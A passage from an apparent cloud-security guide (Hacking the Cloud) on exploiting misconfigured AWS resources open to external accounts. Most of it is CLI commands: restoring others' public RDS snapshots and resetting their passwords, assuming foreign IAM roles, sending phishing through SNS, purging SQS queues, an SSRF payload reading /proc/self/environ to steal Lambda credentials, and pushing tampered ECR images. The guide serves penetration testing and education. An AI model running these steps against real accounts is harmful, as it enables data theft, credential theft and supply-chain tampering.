<span class=c1># lsblk</span>
<span class=c1># mount /dev/sdf1 /mnt</span>
<span class=c1># Search the volume for files and secrets </span>

<span class=c1># Terminate the instance when you&#39;re done</span>
aws<span class=w> </span>ec2<span class=w> </span>terminate-instances<span class=w> </span>--instance-ids<span class=w> </span><span class=nv>$instance_id</span>

<span class=c1># Delete the volume created</span>
aws<span class=w> </span>ec2<span class=w> </span>delete-volume<span class=w> </span>--volume-id<span class=w> </span><span class=nv>$volume_id</span>
</code></pre></div> <h3 id=rds-snapshots>RDS Snapshots<a class=headerlink href=#rds-snapshots title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=c1># Depending on the engine of the target snapshot, you&#39;ll have to install</span>
<span class=c1># the tool for connecting to the RDS server</span>
<span class=c1># We&#39;ll use MySQL in this example </span>

<span class=c1># Search based on AWS account id using jq</span>
<span class=c1># because there is no native way to do this</span>
<span class=c1># Copy the DBSnapshotIdentifier</span>
aws<span class=w> </span>rds<span class=w> </span>describe-db-snapshots<span class=w> </span>--include-public<span class=w> </span><span class=p>|</span><span class=w> </span>jq<span class=w> </span><span class=s1>&#39;.DBSnapshots[] | select(.DBSnapshotArn | contains(&quot;123456789012:&quot;))&#39;</span>

<span class=c1># Restore Snapshot</span>
<span class=c1># Use the DBSnapshotIdentifier from above and create</span>
<span class=c1># a security group that allows all inbound traffic if</span>
<span class=c1># you don&#39;t already have one and use it here</span>
<span class=c1># $db_instance_identifier should be a new custom name for</span>
<span class=c1># the new db </span>
aws<span class=w> </span>rds<span class=w> </span>restore-db-instance-from-db-snapshot<span class=w> </span>--db-instance-identifier<span class=w> </span><span class=nv>$db_instance_identifier</span><span class=w> </span><span class=se>\</span>
<span class=w>    </span>--db-snapshot-identifier<span class=w> </span><span class=nv>$db_snapshot_identifier</span><span class=w> </span><span class=se>\</span>
<span class=w>    </span>--vpc-security-group-ids<span class=w> </span>sg-example1234567890<span class=w> </span>--publicly-accessible<span class=w> </span>--no-multi-az

<span class=c1># This will take around 5-15 minutes so you can run this</span>
<span class=c1># command to know when the database was restored</span>
<span class=c1># The DB Instance Identifier should be the same, but you</span>
<span class=c1># can get it from the output of the previous command</span>
aws<span class=w> </span>rds<span class=w> </span><span class=nb>wait</span><span class=w> </span>db-instance-available<span class=w> </span>--db-instance-identifier<span class=w> </span><span class=nv>$db_instance_identifier</span>

<span class=c1># Change login password</span>
<span class=c1># In the response you will also see the RDS</span>
<span class=c1># endpoint address. Copy that for connecting</span>
<span class=c1># to the instance. The username for login can</span>
<span class=c1># be found in the same response under &quot;MasterUsername&quot;</span>
aws<span class=w> </span>rds<span class=w> </span>modify-db-instance<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--db-instance-identifier<span class=w> </span><span class=nv>$db_instance_identifier</span><span class=w> </span><span class=se>\</span>
<span class=w>    </span>--master-user-password<span class=w> </span>MyNewPassword123!<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--apply-immediately

<span class=c1># Connect to the database</span>
mysql<span class=w> </span>-h<span class=w> </span><span class=nv>$url_db</span><span class=w> </span>-u<span class=w> </span><span class=nv>$username</span><span class=w> </span>--skip-ssl<span class=w> </span>-p
<span class=c1># show databases;</span>
<span class=c1># use $database;</span>
<span class=c1># show tables;</span>

<span class=c1># Delete RDS instance</span>
aws<span class=w> </span>rds<span class=w> </span>delete-db-instance<span class=w> </span>--db-instance-identifier<span class=w> </span><span class=nv>$db_identifier</span><span class=w> </span>--skip-final-snapshot
</code></pre></div> <h3 id=iam-roles>IAM Roles<a class=headerlink href=#iam-roles title="Permanent link">&para;</a></h3> <p>There are roles that can be assumed using various 3rd-party technologies if the role's trust policy is misconfigured.</p> <p>Documented attacks on bad OIDC configurations: - <a href=https://medium.com/tinder/identifying-vulnerabilities-in-github-actions-aws-oidc-configurations-8067c400d5b8>GitHub</a> - <a href=https://hacktodef.com/addressed-aws-defaults-risks-oidc-terraform-and-anonymous-to-administratoraccess>Terraform Cloud</a> - <a href=https://hackingthe.cloud/aws/exploitation/Misconfigured_Resource-Based_Policies/exploiting_misconfigured_gitlab_oidc_aws_iam_roles/ >GitLab</a></p> <p>While the OIDC misconfigurations can be exploited from the internet, the attacks are more complex than what this document aims to help with. Please reefer to the original or related articles around the aforementioned attacks.</p> <div class=highlight><pre><span></span><code><span class=c1># Assuming a public role</span>
<span class=nv>role_name</span><span class=o>=</span>example-role
<span class=c1># Try to assume role</span>
aws<span class=w> </span>sts<span class=w> </span>assume-role<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--role-arn<span class=w> </span>arn:aws:iam::123456789012:role/<span class=nv>$role_name</span><span class=w> </span><span class=se>\</span>
<span class=w>    </span>--role-session-name<span class=w> </span>any-name

<span class=c1># Configure returned credentials</span>
aws<span class=w> </span>--profile<span class=w> </span>any-name<span class=w> </span>configure<span class=w> </span><span class=nb>set</span><span class=w> </span>aws_access_key_id<span class=w> </span><span class=nv>$access_key_id</span>
aws<span class=w> </span>--profile<span class=w> </span>any-name<span class=w> </span>configure<span class=w> </span><span class=nb>set</span><span class=w> </span>aws_secret_access_key<span class=w> </span><span class=nv>$secret_access_key</span>
aws<span class=w> </span>--profile<span class=w> </span>any-name<span class=w> </span>configure<span class=w> </span><span class=nb>set</span><span class=w> </span>aws_session_token<span class=w> </span><span class=nv>$session_token</span>

<span class=c1># Validate credentials</span>
aws<span class=w> </span>--profile<span class=w> </span>any-name<span class=w> </span>sts<span class=w> </span>get-caller-identity
</code></pre></div> <h3 id=ssm-documents>SSM Documents<a class=headerlink href=#ssm-documents title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=c1># Search by name prefix</span>
aws<span class=w> </span>ssm<span class=w> </span>list-documents<span class=w> </span>--filters<span class=w> </span><span class=s2>&quot;Key=Owner,Values=Public&quot;</span><span class=w> </span><span class=s2>&quot;Key=Name,Values=hackingthe.cloud&quot;</span>

<span class=c1># Search by owner with jq</span>
<span class=c1># Takes 15-30 seconds to execute</span>
<span class=c1># Copy the value from the &quot;Name&quot; field</span>
aws<span class=w> </span>ssm<span class=w> </span>list-documents<span class=w> </span>--filters<span class=w> </span><span class=s2>&quot;Key=Owner,Values=Public&quot;</span><span class=w> </span><span class=p>|</span><span class=w> </span>jq<span class=w> </span><span class=s1>&#39;.DocumentIdentifiers[] | select(.Owner | contains(&quot;123456789012&quot;))&#39;</span>

<span class=c1># List document versions</span>
<span class=c1># Different versions can have different</span>
<span class=c1># secrets or details</span>
aws<span class=w> </span>list-document-versions<span class=w> </span>--name<span class=w> </span><span class=nv>$document_name</span>

<span class=c1># Get document details</span>
<span class=c1># If the document has more versions you can use --document-version $number</span>
<span class=c1># to get details about that version</span>
<span class=c1># If version is not specified then the default one is used</span>
aws<span class=w> </span>ssm<span class=w> </span>describe-document<span class=w> </span>--name<span class=w> </span><span class=nv>$document_name</span>

<span class=c1># Get the actual content of the document</span>
<span class=c1># Use --document-version $number if multiple versions</span>
aws<span class=w> </span>ssm<span class=w> </span>get-document<span class=w> </span>--name<span class=w> </span><span class=nv>$document_name</span>
</code></pre></div> <h3 id=cloudfront>CloudFront<a class=headerlink href=#cloudfront title="Permanent link">&para;</a></h3> <p>If the CloudFront distribution has as origin a misconfigured S3 bucket, then even if the bucket is configured to block public access, it might be possible to list the bucket by accessing the distribution's URL. In order for this to work the bucket policy needs to allow "s3:ListBucket" for the CloudFront's Origin Access Identity (OAI). Most likely you will not encounter this outside a lab.</p> <div class=highlight><pre><span></span><code><span class=c1># Try to list the bucket (Should not work)</span>
<span class=c1># You won&#39;t know the bucket if you only have the distribution&#39;s URL</span>
aws<span class=w> </span>s3<span class=w> </span>ls<span class=w> </span>s3://example-bucket

<span class=c1># Access the distribution and list the files</span>
curl<span class=w> </span>https://example1234567.cloudfront.net

<span class=c1># Read sensitive files</span>
curl<span class=w> </span>https://example1234567.cloudfront.net/<span class=nv>$file</span>
</code></pre></div> <h2 id=2-cant-be-found-from-a-black-box-perspective>2. Can't be found from a black-box perspective<a class=headerlink href=#2-cant-be-found-from-a-black-box-perspective title="Permanent link">&para;</a></h2> <p>These services can't be identified from a purely black-box perspective (exception the Public ECR), but they can be misconfigured so that they can be accessed from any external AWS account. For most of these services you need additional information that most likely you'll not find from the internet, brute-forcing or similar techniques. </p> <h3 id=sns-topics>SNS Topics<a class=headerlink href=#sns-topics title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=c1># List topic subscribers</span>
<span class=c1># This will return the subscribers which can be</span>
<span class=c1># email addresses or other services like SQS queues</span>
<span class=c1># that might be public as well</span>
aws<span class=w> </span>sns<span class=w> </span>list-subscriptions-by-topic<span class=w> </span>--topic-arn<span class=w> </span>arn:aws:sns:<span class=nv>$region</span>:123456789012:example-topic

<span class=c1># Get topic attributes</span>
aws<span class=w> </span>sns<span class=w> </span>get-topic-attributes<span class=w> </span>--topic-arn<span class=w> </span>arn:aws:sns:<span class=nv>$region</span>:123456789012:example-topic

<span class=c1># Subscribe to the topic</span>
<span class=c1># If you subscribe you will get a confirmation</span>
<span class=c1># email with a link you have to access</span>
<span class=c1># After confirming you will receive any messages sent</span>
<span class=c1># to the topic</span>
aws<span class=w> </span>sns<span class=w> </span>subscribe<span class=w> </span>--topic-arn<span class=w> </span>arn:aws:sns:<span class=nv>$region</span>:123456789012:example-topic<span class=w> </span><span class=se>\</span>
<span class=w>        </span>--protocol<span class=w> </span>email<span class=w> </span><span class=se>\</span>
<span class=w>        </span>--notification-endpoint<span class=w> </span><span class=nv>$email_address</span>


<span class=c1># Publish to topic</span>
<span class=c1># All subscribers will receive this message</span>
<span class=c1># This can be leveraged to perform phishing attacks</span>
aws<span class=w> </span>sns<span class=w> </span>publish<span class=w> </span>--topic-arn<span class=w> </span>arn:aws:sns:<span class=nv>$region</span>:123456789012:example-topic<span class=w> </span>--message<span class=w> </span><span class=s2>&quot;This is the email body&quot;</span><span class=w> </span>--subject<span class=w> </span><span class=s2>&quot;This is the email subject&quot;</span>
</code></pre></div> <h3 id=sqs-queues>SQS Queues<a class=headerlink href=#sqs-queues title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=c1># Send message</span>
aws<span class=w> </span>sqs<span class=w> </span>send-message<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--queue-url<span class=w> </span>https://sqs.<span class=nv>$region</span>.amazonaws.com/123456789012/example-queue<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--message-body<span class=w> </span><span class=s2>&quot;Your message&quot;</span>

<span class=c1># Receive messages</span>
<span class=c1># This will remove the message from the queue</span>
aws<span class=w> </span>sqs<span class=w> </span>receive-message<span class=w> </span>--queue-url<span class=w> </span>https://sqs.<span class=nv>$region</span>.amazonaws.com/123456789012/example-queue

<span class=c1># Delete message</span>
<span class=c1># Message will be deleted anyway when</span>
<span class=c1># running receive-message in default implementations</span>
aws<span class=w> </span>sqs<span class=w> </span>delete-message<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--queue-url<span class=w> </span>https://sqs.<span class=nv>$region</span>.amazonaws.com/123456789012/example-queue<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--receipt-handle<span class=w> </span><span class=nv>$big_string_from_receive_message_call</span>

<span class=c1># This will delete all items in the queue</span>
aws<span class=w> </span>sqs<span class=w> </span>purge-queue<span class=w> </span>--queue-url<span class=w> </span>https://sqs.<span class=nv>$region</span>.amazonaws.com/123456789012/example-queue
</code></pre></div> <h3 id=private-api-gateways>Private API Gateways<a class=headerlink href=#private-api-gateways title="Permanent link">&para;</a></h3> <p>A private API Gateway is private in the sens that it can't be accessed from outside the AWS's network. People can mistake a private API Gateway as being accessible only from their AWS account, which is a common misconception. </p> <div class=highlight><pre><span></span><code><span class=c1># Example API Gateway details</span>
<span class=nv>api_id</span><span class=o>=</span>example123
<span class=nv>region</span><span class=o>=</span>eu-central-1
<span class=nv>stage</span><span class=o>=</span>prod
<span class=nv>endpoint</span><span class=o>=</span>fetch

<span class=c1># Try to access the API gateway from your host/VM</span>
<span class=c1># It should not work</span>
curl<span class=w> </span>https://<span class=nv>$api_id</span>.execute-api.<span class=nv>$region</span>.amazonaws.com/<span class=nv>$stage</span>/<span class=nv>$endpoint</span>
nslookup<span class=w> </span><span class=nv>$api_id</span>.execute-api.<span class=nv>$region</span>.amazonaws.com

<span class=c1># We&#39;ll start an EC2 instance and perform the # request from there</span>
<span class=c1># The instance must be in the same region as the target API</span>
<span class=c1># Create a security group that allows all inbound traffic if</span>
<span class=c1># you don&#39;t already have one and use it here</span>
<span class=c1># The AMI is for the latest Amazon Linux image at the moment of writing this article</span>
<span class=c1># Save the instance ID for later</span>
aws<span class=w> </span>--region<span class=w> </span><span class=nv>$region</span><span class=w> </span>ec2<span class=w> </span>run-instances<span class=w> </span>--security-group-ids<span class=w> </span>sg-example1234567<span class=w> </span>--instance-type<span class=w> </span>t2.micro<span class=w> </span>--image-id<span class=w> </span>ami-0b5673b5f6e8f7fa7

<span class=c1># Check if you have VPC endpoint com.amazonaws.$region.execute-api</span>
aws<span class=w> </span>--region<span class=w> </span><span class=nv>$region</span><span class=w> </span>ec2<span class=w> </span>describe-vpc-endpoints

<span class=c1># Skip this if the VPC endpoint already exist</span>
<span class=c1># Create the VPC Endpoint</span>
<span class=c1># Should take around 1-2 minutes to be available</span>
<span class=c1># Run either &#39;aws ec2 describe-instances&#39; or</span>
<span class=c1># &#39;aws ec2 describe-vpcs&#39; or &#39;aws-describe-subnets&#39; in order</span>
<span class=c1># to get the information about the VPC id along with the subnet ids</span>
<span class=c1># You have to use the same VPC as the one of the previous EC2</span>
<span class=c1># Create a security group that allows all inbound traffic if</span>
<span class=c1># you don&#39;t already have one and use it here</span>
aws<span class=w> </span>ec2<span class=w> </span>create-vpc-endpoint<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--vpc-id<span class=w> </span>vpc-example1234567<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--vpc-endpoint-type<span class=w> </span>Interface<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--service-name<span class=w> </span>com.amazonaws.<span class=nv>$region</span>.execute-api<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--subnet-ids<span class=w> </span>subnet-example1234567,subnet-example1234567,subnet-example1234567<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--security-group-ids<span class=w> </span>sg-example1234567<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--private-dns-enabled

<span class=c1># Connect to the instance</span>
aws<span class=w> </span>ec2-instance-connect<span class=w> </span>ssh<span class=w> </span>--os-user<span class=w> </span>root<span class=w> </span>--instance-id<span class=w> </span><span class=nv>$instance_id</span>
</code></pre></div> <div class=highlight><pre><span></span><code><span class=c1># Now we should be able to resolve and invoke the private API Gateway</span>
<span class=c1># Check DNS resolution</span>
nslookup<span class=w> </span><span class=nv>$api_id</span>.execute-api.<span class=nv>$region</span>.amazonaws.com

<span class=c1># Invoke the API</span>
curl<span class=w> </span>https://<span class=nv>$api_id</span>.execute-api.<span class=nv>$region</span>.amazonaws.com/<span class=nv>$stage</span>/<span class=nv>$endpoint</span>
</code></pre></div> <p><em>Delete the instance and the VPC Endpoint when you're done. VPC Endpoints can get expensive.</em></p> <h3 id=lambda-functions>Lambda Functions<a class=headerlink href=#lambda-functions title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=nv>function_name</span><span class=o>=</span>example-function
<span class=c1># Invoke function via AWS CLI</span>
<span class=c1># Because the function is from an external account, the</span>
<span class=c1># whole ARN must be specified</span>
<span class=c1># You can invoke a certain version of the function by adding its number at the end</span>
<span class=c1># e.g. arn:aws:lambda:$region:123456789012:function:$function_name:1</span>
aws<span class=w> </span>lambda<span class=w> </span>invoke<span class=w> </span>--function-name<span class=w> </span>arn:aws:lambda:<span class=nv>$region</span>:123456789012:function:<span class=nv>$function_name</span><span class=w> </span><span class=se>\</span>
<span class=w>    </span>--payload<span class=w> </span><span class=s1>&#39;&lt;input&gt;&#39;</span>

<span class=c1># If the function is vulnerable to SSRF you might</span>
<span class=c1># be able to exfiltrate the access credentials by reading</span>
<span class=c1># the contents of /proc/self/environ</span>
<span class=c1># For this you need to specify --cli-binary-format</span>
<span class=c1># This is can be used as a persistence technique</span>
aws<span class=w> </span>lambda<span class=w> </span>invoke<span class=w> </span>--function-name<span class=w> </span>arn:aws:lambda:<span class=nv>$region</span>:123456789012:function:<span class=nv>$function_name</span><span class=w> </span><span class=se>\</span>
<span class=w>    </span>--payload<span class=w> </span><span class=s1>&#39;{&quot;queryStringParameters&quot;:{&quot;url&quot;:&quot;file:///proc/self/environ&quot;}}&#39;</span><span class=w> </span><span class=se>\ </span><span class=w>                                              </span>
<span class=w>    </span>--cli-binary-format<span class=w> </span>raw-in-base64-out<span class=w> </span>output.txt

<span class=c1># Invoke the function by its URL</span>
<span class=c1># Just because the Lambda Function can be invoked</span>
<span class=c1># by anyone, doesn&#39;t mean it will have a public URL</span>
<span class=c1># There is no known way to reverse the function URL</span>
<span class=c1># to get the function ARN or vice-versa</span>
curl<span class=w> </span>https://examplexample12345678901234567890exa.lambda-url.<span class=nv>$region</span>.on.aws/?url<span class=o>=</span>file:///proc/self/environ<span class=w> </span>&gt;<span class=w> </span>output.txt
</code></pre></div> <h3 id=ecr-repositories>ECR Repositories<a class=headerlink href=#ecr-repositories title="Permanent link">&para;</a></h3> <h4 id=private-repository-access>Private Repository Access<a class=headerlink href=#private-repository-access title="Permanent link">&para;</a></h4> <p>Even if the repository is private, it can be misconfigured so that it allows any other AWS account to access it.</p> <div class=highlight><pre><span></span><code><span class=c1># Login first</span>
<span class=c1># This command might not work on Windows</span>
aws<span class=w> </span>ecr<span class=w> </span>get-login-password<span class=w> </span><span class=p>|</span><span class=w> </span>docker<span class=w> </span>login<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--username<span class=w> </span>AWS<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--password-stdin<span class=w> </span><span class=m>123456789012</span>.dkr.ecr.<span class=nv>$region</span>.amazonaws.com/example-private

<span class=c1># Pull image</span>
docker<span class=w> </span>pull<span class=w> </span><span class=m>123456789012</span>.dkr.ecr.<span class=nv>$region</span>.amazonaws.com/example-private:latest

<span class=c1># Inspect image for secrets</span>
<span class=c1># You can search the image in multiple ways</span>
docker<span class=w> </span><span class=nb>history</span><span class=w> </span><span class=m>123456789012</span>.dkr.ecr.<span class=nv>$region</span>.amazonaws.com/example-private:latest<span class=w> </span>--no-trunc
docker<span class=w> </span>inspect<span class=w> </span><span class=m>123456789012</span>.dkr.ecr.<span class=nv>$region</span>.amazonaws.com/example-private:latest
docker<span class=w> </span>run<span class=w> </span>-it<span class=w> </span><span class=m>123456789012</span>.dkr.ecr.<span class=nv>$region</span>.amazonaws.com/example-private:latest<span class=w> </span>cat<span class=w> </span>/etc/environment

<span class=c1># You can even push a new version of the image</span>
<span class=c1># if the ECR is that badly misconfigured</span>
docker<span class=w> </span>push<span class=w> </span><span class=m>123456789012</span>.dkr.ecr.<span class=nv>$region</span>.amazonaws.com/example-private:latest
</code></pre></div> <h4 id=public-repository-access>Public Repository Access<a class=headerlink href=#public-repository-access title="Permanent link">&para;</a></h4> <p>This is the case where the company created a public repository instead of a private one. Compared with the other services from section 3, this one can be found from a black-box perspective.</p> <div class=highlight><pre><span></span><code><span class=c1># You can find the repository by searching it</span>
<span class=c1># https://gallery.ecr.aws/search?searchTerm=hackingthe.cloud</span>

<span class=c1># Login</span>
<span class=c1># The public ECR is available only in us-east-1</span>
aws<span class=w> </span>ecr-public<span class=w> </span>get-login-password<span class=w> </span>--region<span class=w> </span>us-east-1<span class=w> </span><span class=p>|</span><span class=w> </span>docker<span class=w> </span>login<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--username<span class=w> </span>AWS<span class=w> </span><span class=se>\</span>
<span class=w>    </span>--password-stdin<span class=w> </span>public.ecr.aws/id123456/example-public


<span class=c1># Pull public image</span>
docker<span class=w> </span>pull<span class=w> </span>public.ecr.aws/id123456/example-public

<span class=c1># Inspect image for secrets</span>
<span class=c1># You can search the image in multiple ways</span>
docker<span class=w> </span><span class=nb>history</span><span class=w> </span>public.ecr.aws/id123456/example-public<span class=w> </span>--no-trunc
docker<span class=w> </span>inspect<span class=w> </span>public.ecr.aws/id123456/example-public
docker<span class=w> </span>run<span class=w> </span>-it<span class=w> </span>1public.ecr.aws/id123456/example-public<span class=w> </span>cat<span class=w> </span>/etc/environment
</code></pre></div> <h2 id=call-for-contributions>Call for contributions<a class=headerlink href=#call-for-contributions title="Permanent link">&para;</a></h2> <p>Do you know other relevant services that can be misconfigured so that they grant read, write or execute permissions over their resources? Feel free to add or suggest them.</p> <p>One service that should be included in this document is AWS Cognito. However, recently AWS performed some changes over how Cognito can be configured and further analysis is required before I can vouch for the attacks against it.</p> <aside class=md-source-file> <span class=md-source-file__fact> <span class=md-icon title="Last update"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">December 5, 2024</span> </span> <span class=md-source-file__fact> <span class=md-icon title=Created> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg> </span> <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">December 5, 2024</span> </span> <span class=md-source-file__fact> <span class=md-icon title=Contributors> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34-.46-1.16-1.11-1.47-1.11-1.47-.91-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.87 1.52 2.34 1.07 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.92 0-1.11.38-2 1.03-2.71-.1-.25-.45-1.29.1-2.64 0 0 .84-.27 2.75 1.02.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02.55 1.35.2 2.39.1 2.64.65.71 1.03 1.6 1.03 2.71 0 3.82-2.34 4.66-4.57 4.91.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"/></svg> </span> <span>GitHub</span> <nav> <a href=https://github.com/Frichetten class=md-author title=@Frichetten> <img src="https://avatars.githubusercontent.com/u/10386884?v=4&size=72" alt=Frichetten> </a> <a href=https://github.com/web-flow class=md-author title=@web-flow> <img src="https://avatars.githubusercontent.com/u/19864447?v=4&size=72" alt=web-flow> </a> </nav> </span> </aside> </article> </div> <script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script> </div> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs Insiders </a> </div> <div class=md-social> <a href=https://infosec.exchange/@hackingthecloud target=_blank rel="noopener me" title=infosec.exchange class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48 0 0 0-63.72 28.5-63.72 125.7 0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.5 102.5 0 0 1-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5m-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg> </a> <a href=https://bsky.app/profile/hackingthe.cloud target=_blank rel=noopener title=bsky.app class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M111.8 62.2C170.2 105.9 233 194.7 256 242.4c23-47.6 85.8-136.4 144.2-180.2 42.1-31.6 110.3-56 110.3 21.8 0 15.5-8.9 130.5-14.1 149.2-18.2 64.8-84.4 81.4-143.3 71.3C456 322 482.2 380 425.6 438c-107.4 110.2-154.3-27.6-166.3-62.9-1.7-4.9-2.6-7.8-3.3-7.8s-1.6 3-3.3 7.8c-12 35.3-59 173.1-166.3 62.9-56.5-58-30.4-116 72.5-133.5C100 314.6 33.8 298 15.7 233.1 10.4 214.4 1.5 99.4 1.5 83.9c0-77.8 68.2-53.4 110.3-21.8z"/></svg> </a> <a href=https://x.com/HackingthCloud target=_blank rel=noopener title=x.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253"/></svg> </a> <a href=https://www.linkedin.com/company/hacking-the-cloud/ target=_blank rel=noopener title=www.linkedin.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg> </a> <a href=https://github.com/Hacking-the-Cloud target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 